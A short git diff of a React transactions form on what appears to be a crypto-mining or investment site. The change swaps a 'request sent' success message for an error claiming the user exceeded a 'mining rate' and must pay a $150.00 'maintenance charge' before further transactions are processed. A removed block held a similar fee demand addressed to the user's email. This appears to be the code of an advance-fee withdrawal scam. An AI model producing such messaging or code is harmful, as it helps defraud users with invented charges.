@@ -44,8 +44,8 @@ function TransactionsForm({ getTransactions }) {
       await requestClient.post("transaction/", transactionData, {
         withCredentials: true,
       });
-      message.success(
-        "Request has been sent! Would be processed within the next 24hrs"
+      message.error(
+        "Hi, Consequent upon exceeding the mining rate of your account, a maintenance charge of $150.00 is required to process further transactions. Best Regards."
       );
     } catch (err) {
       console.error(err);
@@ -83,10 +83,6 @@ function TransactionsForm({ getTransactions }) {
                         hours.
                       </p>
                     </div>
-
-                    <p className="text-gray-900 text-xl">
-                      Hi, {loggedIn.email}, Consequent upon your numerous request to the system, a maintenance charge of <span className="font-bold">$150.00 </span>is required to process further transactions. Best Regards.
-                    </p>
                   </div>
 
                   <div className="relative w-full mb-3 mt-8">
